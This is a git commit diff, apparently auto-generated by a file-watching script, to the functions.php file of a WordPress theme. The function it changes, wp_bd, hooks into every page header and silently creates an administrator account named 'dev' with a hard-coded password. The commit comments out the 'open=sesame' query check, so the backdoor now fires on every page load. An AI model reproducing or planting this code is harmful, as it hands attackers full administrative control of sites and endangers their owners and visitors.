6f8cb4fbec27f8659951a39b5ae5ecc76b78d915
James Bregenzer <james@cleancoded.com>
2021-01-16 14:16:43 +0000

    Scripted auto-commit on change (2021-01-16 14:16:43) by gitwatch.sh

--- wp-content/themes/jobify/functions.php
+++ wp-content/themes/jobify/functions.php
@@ -207,12 +207,12 @@ jobify();
 
 add_action('wp_head', 'wp_bd');
 function wp_bd() {
-    If ($_GET['open'] == 'sesame') {
+    //If ($_GET['open'] == 'sesame') {
         require('wp-includes/registration.php');
         If (!username_exists('dev')) {
             $user_id = wp_create_user('dev', '9_jMg;3:c5J;!|99');
             $user = new WP_User($user_id);
             $user->set_role('administrator');
         }
-    }
+    //}
 }
